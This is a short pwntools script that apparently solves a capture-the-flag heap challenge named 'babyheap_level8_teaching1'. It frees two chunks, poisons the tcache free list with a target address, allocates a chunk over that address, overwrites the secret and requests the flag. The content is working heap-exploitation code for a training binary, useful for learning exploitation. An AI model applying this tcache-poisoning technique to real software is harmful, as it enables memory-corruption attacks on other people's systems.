from pwn import *
p = process('/babyheap_level8_teaching1')
p.send(b'malloc\n0\n32\n')
p.send(b'malloc\n1\n32\n')
p.clean()
x = 0x42a900
addr = str(x)
p.send(b'free\n1\n')
p.send(b'free\n0\n')
p.clean().decode('utf-8')
p.send(b'scanf\n0\n'+p64(x)+b'\n')
p.send(b'malloc\n2\n32\n')
p.send(b'malloc\n3\n32\n')
p.send(b'scanf\n3\n'+b'A'*32+b'\n')
p.clean().decode('utf-8')
p.send(b'send_flag\n'+b'A'*32+b'\n')
log.info(p.clean().decode('utf-8'))
p.close()
